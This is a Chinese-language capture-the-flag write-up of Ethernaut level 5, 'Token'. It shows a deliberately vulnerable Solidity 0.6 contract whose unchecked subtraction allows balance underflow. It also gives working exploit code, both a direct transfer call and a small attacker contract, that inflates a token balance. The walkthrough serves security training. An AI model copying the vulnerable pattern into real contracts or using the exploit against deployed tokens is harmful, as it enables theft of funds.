# Ethernaut:05_Token
### 合約分析
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

    mapping(address => uint) balances;
    uint public totalSupply;
  
    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }
  
    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
  
    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
```

這個合約中有一個關鍵的漏洞在於 `transfer` 函數中的這一行：

```solidity
require(balances[msg.sender] - _value >= 0);
```

這個檢查表面上是用來確保轉帳金額 `_value` 不會超過 `msg.sender` 的餘額，但是，由於合約使用的是 Solidity 0.6.0 版本，這個版本的 Solidity 並沒有自動檢測溢位的功能。也就是說，如果 `balances[msg.sender]` 的值本來就很小，而你試圖轉出比餘額還多的代幣，這裡會發生 **下溢**（underflow）。

例如，假設 `balances[msg.sender]` 是 20，而 `_value` 是 21，這時 `balances[msg.sender] - _value` 會嘗試減去超過餘額的數字，結果會發生下溢，變成一個極大的正數，這樣就能通過 `require` 檢查，並導致你的餘額變成一個非常大的數字。

### Solutions

步驟如下：

1. **確認初始餘額**：當合約部署時，合約會給你（玩家地址）一個初始的代幣數量，例如 20 個代幣。
2. **觸發下溢**：我們要利用 `transfer` 函數來觸發下溢。你可以執行如下操作：

```solidity
IToken(challengeInstance).transfer(challengeInstance, 21);
```

這裡 `challengeInstance` 是合約的地址，而 `21` 是我們想要轉出的代幣數量。由於你的餘額只有 20 個代幣，當你試圖轉出 21 個代幣時，會觸發下溢，讓你的餘額變成一個極大值。

3. **獲取大量代幣**：執行以上操作後，你的帳戶餘額會變成一個非常大的數字，這樣就能成功通關。

### 實際操作
```solidity
pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
```
### 參考資料
- [YouTube - Ethernaut 05 - Token](https://youtu.be/IxSK_OMVqu4?si=dwDQuEuF3-yVqssU)
